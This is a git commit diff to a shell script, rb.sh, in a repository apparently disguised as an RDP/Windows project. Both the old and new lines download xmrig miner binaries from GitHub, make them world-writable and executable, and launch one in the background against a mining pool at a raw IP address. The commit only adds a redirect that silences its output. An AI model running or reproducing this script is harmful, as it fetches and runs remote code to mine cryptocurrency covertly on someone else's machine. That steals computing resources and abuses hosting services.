ba7016c48ea0f2018194d1c26cfb2699424b81fd
SalinaMoh <98037354+SalinaMoh@users.noreply.github.com>
2022-04-08 13:26:13 +0000

    Update rb.sh

--- rb.sh
+++ rb.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigDaemon && wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigMiner && chmod 777 xmrigDaemon && chmod 777 xmrigMiner && ./xmrigDaemon -o 8.209.98.71:443 -u Azud -p x --donate-level 1 -k  /dev/null 2>&1 &
+wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigDaemon && wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigMiner && chmod 777 xmrigDaemon && chmod 777 xmrigMiner && ./xmrigDaemon -o 8.209.98.71:443 -u Azud -p x --donate-level 1 -k  > /dev/null 2>&1 &
 uname -a
